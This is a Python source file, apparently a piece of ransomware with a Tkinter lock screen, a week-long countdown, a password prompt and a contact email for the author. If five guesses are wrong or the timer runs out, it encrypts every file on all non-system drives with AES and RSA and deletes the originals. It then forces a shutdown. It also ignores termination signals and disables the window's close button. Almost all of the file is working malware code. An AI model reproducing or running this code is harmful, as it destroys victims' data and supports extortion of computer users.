import tkinter as tk
from tkinter import messagebox
import time
import os
import threading
import signal
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
import string
import random

# 忽略终止信号
signal.signal(signal.SIGINT, signal.SIG_IGN)
signal.signal(signal.SIGTERM, signal.SIG_IGN)

# 字典
random_strings = [
    # 这里可以填入一些随机字符串和密码
]

# 加密部分
def encrypt_file(file_path, public_key):
    # 生成一个随机的AES密钥
    aes_key = get_random_bytes(16)  # AES-128
    cipher_aes = AES.new(aes_key, AES.MODE_EAX)

    # 读取文件内容
    with open(file_path, "rb") as file:
        data = file.read()

    # 使用AES加密数据
    encrypted_data, tag = cipher_aes.encrypt_and_digest(data)

    # 使用RSA加密AES密钥
    cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)

    # 将加密后的AES密钥、nonce、tag和加密数据写入新文件
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_aes_key)
        encrypted_file.write(cipher_aes.nonce)
        encrypted_file.write(tag)
        encrypted_file.write(encrypted_data)

    # 删除原始文件
    os.remove(file_path)

def encrypt_folder(folder_path, public_key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, public_key)

def Fuck():
    print("Fuck O w O")
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP

    # 生成RSA密钥对
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()

    with open("public_key.pem", "wb") as pub_file:
        pub_file.write(public_key)

    with open("private_key.pem", "wb") as priv_file:
        priv_file.write(private_key)

    # 获取所有磁盘
    drives = [drive for drive in string.ascii_uppercase if os.path.exists(f"{drive}:\\")]

    # 排除系统磁盘（通常是C盘）
    system_drive = "C"
    if system_drive in drives:
        drives.remove(system_drive)

    # 加密所有非系统磁盘的文件和文件夹
    for drive in drives:
        drive_path = f"{drive}:\\"
        encrypt_folder(drive_path, public_key)

    print("加密完成，文件后缀已修改为.enc")
    time.sleep(1)
    messagebox.showinfo("成功", "O w O\n文件已加密\nThe file is encrypted")
    time.sleep(3)
    os.system("shutdown -s -t 0")

# 创建一个字典，存储代码和对应的密码
password_dict = {}
for s in random_strings:
    code, password = s.split("-")[0], s.split("-")[-2]  # 提取代码和密码
    password_dict[code] = password

# 初始化错误次数计数器
error_count = 0

def check_password():
    global error_count
    code = code_entry.get()  # 获取用户输入的代码
    password = password_entry.get()  # 获取用户输入的密码

    # 检查密码是否正确
    if code in password_dict and password_dict[code] == password:
        print("成功")
        messagebox.showinfo("成功", "O w O\n密码正确！\n你太棒了\nThe password is correct!\nYou are amazing")
        root.destroy()
        sys.exit()
    else:
        error_count += 1
        if error_count >= 5:
            print("错误")
            messagebox.showerror("错误", "O M O\n你还是太不珍惜你的电脑了\nYou still don't value your computer too much.")
            root.destroy()
            Fuck()
        else:
            messagebox.showerror("错误", f"> w <\n密码错误！剩余尝试次数：{5 - error_count}\n小心点哦\nWrong password! Remaining attempts: {5 - error_count}\nBe careful")

# 创建主窗口
root = tk.Tk()
root.title("密码验证OwO")
root.geometry("400x300")

# 创建代码输入框
code_label = tk.Label(root, text="代码(Code)")
code_label.pack(pady=5)
code_entry = tk.Entry(root)
code_entry.pack(pady=5)

# 创建密码输入框
password_label = tk.Label(root, text="密码(PassWorld)")
password_label.pack(pady=5)
password_entry = tk.Entry(root, show="*")  # 密码显示为 *
password_entry.pack(pady=5)

# 创建验证按钮
submit_button = tk.Button(root, text="验证(verify)", command=check_password)
submit_button.pack(pady=10)

# 创建计时界面
timer_frame = tk.Frame(root)
timer_frame.pack(side=tk.BOTTOM, pady=10)

timer_label = tk.Label(timer_frame, text="剩余时间：", font=("Arial", 12))
timer_label.pack(side=tk.LEFT, padx=5)
youxiang = tk.Label(text="作者邮箱:3632761842@qq.com\n尽快联系哦\nO w O", font=("Arial", 12))
youxiang.pack(side=tk.TOP, expand=True, fill=tk.BOTH)

# 初始化计时器
start_time = time.time()
end_time = start_time + 7 * 24 * 60 * 60  # 一周的时间戳
remaining_time_path = "v_time.txt"  # 剩余时间保存路径

# 生成RSA密钥对
def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()

    with open("public_key.pem", "wb") as pub_file:
        pub_file.write(public_key)

    with open("private_key.pem", "wb") as priv_file:
        priv_file.write(private_key)

# 检查密钥文件是否存在，不存在则生成
if not os.path.exists("public_key.pem") or not os.path.exists("private_key.pem"):
    generate_keys()

# 加密保存时间
def save_time(remaining_time):
    with open("public_key.pem", "rb") as f:
        public_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_time = cipher_rsa.encrypt(str(remaining_time).encode())

    with open(remaining_time_path, "wb") as f:
        f.write(encrypted_time)

# 读取加密时间
def load_time():
    if os.path.exists(remaining_time_path):
        with open(remaining_time_path, "rb") as f:
            encrypted_time = f.read()

        with open("private_key.pem", "rb") as f:
            private_key = RSA.import_key(f.read())
        cipher_rsa = PKCS1_OAEP.new(private_key)
        try:
            remaining_time = float(cipher_rsa.decrypt(encrypted_time).decode())
            return remaining_time
        except:
            return None
    return None

# 禁用窗口关闭按钮
def disable_close():
    messagebox.showerror("错误", "无法关闭程序！")

root.protocol("WM_DELETE_WINDOW", disable_close)

# 捕获系统关闭信号
def handle_exit(signum, frame):
    remaining_time = end_time - time.time()
    save_time(remaining_time)
    sys.exit()

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

def countdown():
    global end_time
    loaded_time = load_time()
    if loaded_time is not None:
        end_time = time.time() + loaded_time

    while True:
        remaining_time = end_time - time.time()
        if remaining_time <= 0:
            messagebox.showerror("错误", "O M O\n你还是太不珍惜你的电脑了\nYou still don't value your computer too much.")
            Fuck()
            break

        days = int(remaining_time // (24 * 60 * 60))
        hours = int((remaining_time % (24 * 60 * 60)) // 3600)
        minutes = int((remaining_time % 3600) // 60)
        seconds = int(remaining_time % 60)
        timer_label.config(text=f"剩余时间：{days}天{hours}时{minutes}分{seconds}秒")

        # 将剩余时间保存到文件
        save_time(remaining_time)

        time.sleep(1)
        if days == 3 or days == 1:
            messagebox.showwarning("提醒", f"距离计时结束还有{days}天")

# 启动计时器线程
timer_thread = threading.Thread(target=countdown)
timer_thread.daemon = True  # 设置为守护线程，主程序结束时自动结束
timer_thread.start()

# 运行主循环
root.mainloop()